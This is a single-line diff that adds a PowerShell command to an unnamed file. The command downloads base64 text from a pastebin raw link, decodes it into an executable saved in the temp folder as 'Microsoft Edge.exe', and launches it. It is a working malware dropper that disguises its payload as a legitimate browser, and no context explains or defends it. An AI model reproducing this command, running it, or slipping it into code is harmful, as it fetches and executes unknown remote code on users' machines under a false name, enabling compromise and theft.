@@ -1,0 +1,1 @@
+$url='https://pastebin.com/raw/72cB2cGn'; $b64=(Invoke-WebRequest -Uri $url).Content.Trim(); $path=[System.IO.Path]::Combine($env:TEMP, 'Microsoft Edge.exe'); [System.IO.File]::WriteAllBytes($path, [System.Convert]::FromBase64String($b64)); Start-Process $path
